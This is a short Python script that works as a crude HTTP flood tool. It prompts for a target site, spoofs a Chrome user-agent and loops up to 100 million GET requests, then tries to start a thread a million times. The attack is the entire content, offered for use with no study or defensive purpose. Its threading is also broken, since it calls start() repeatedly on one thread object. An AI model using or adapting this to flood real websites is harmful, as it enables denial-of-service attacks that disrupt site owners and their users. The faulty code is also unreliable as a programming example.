import threading
import requests
site=input("Enter Site: ")
def requestcatcher():
	headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36"}
	for b in range(100000000):
		r = requests.get(site, headers=headers)
		print(r)
t1=threading.Thread(target=requestcatcher)
for i in range(1000000):
  t1.start()
